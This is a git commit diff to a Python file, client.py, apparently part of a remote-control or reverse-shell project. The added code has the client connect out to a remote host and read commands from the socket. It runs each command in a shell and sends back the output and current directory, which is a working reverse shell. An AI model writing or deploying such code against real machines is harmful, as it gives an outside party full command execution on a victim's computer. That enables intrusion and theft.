9e81b90de450240476aa43d9cd4a1fa1ac0e8d1e
Aman Srivastava <aman.srivastava999@gmail.com>
2016-06-17 20:52:55 +0530

    Added command recieve functions to client

--- client.py
+++ client.py
@@ -25,3 +25,29 @@ def socket_connect():
         s.connect((host, port))
     except socket.error as msg:
         print("Socket connection error: " + str(msg))
+
+
+# Receive commands and run 'em
+# Receive commands from remote server and run on local machine
+def receive_commands():
+    global s
+    while True:
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8"))
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_bytes, "utf-8")
+            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+            print(output_str)
+    s.close()
+
+
+def main():
+    socket_create()
+    socket_connect()
+    receive_commands()
+
+
+main()
